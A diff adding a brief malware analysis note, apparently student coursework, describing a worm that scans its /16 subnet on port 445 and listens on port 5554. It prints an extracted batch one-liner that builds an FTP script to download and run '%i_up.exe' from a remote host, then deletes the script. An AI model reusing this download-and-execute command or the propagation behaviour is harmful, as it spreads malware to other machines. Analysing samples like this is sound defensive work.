@@ -1,0 +1,11 @@
+Jessica Rooney
+2//2020
+What the program does
+How to compile it
+
+malware.exe is attempting to connect to other computers under the same first two subnets, and then sequentially looking through everyone else on the subnet (subnet mask is 255.255.0.0), attempting to connect to port 445.
+It is listening on port 5554
+
+00406934	echo off&echo open %s 5554>>cmd.ftp&echo anonymous>>cmd.ftp&echo user&echo bin>>cmd.ftp&echo get %i_up.exe>>cmd.ftp&echo bye>>cmd.ftp&echo on&ftp -s:cmd.ftp&%i_up.exe&echo off&del cmd.ftp&echo on
+	echo off&echo open %s 5554>>cmd.ftp&echo anonymous>>cmd.ftp&echo user&echo bin>>cmd.ftp&echo get %i_up.exe>>cmd.ftp&echo bye>>cmd.ftp&echo on&ftp -s:cmd.ftp&%i_up.exe&echo off&del cmd.ftp&echo on
+	ds
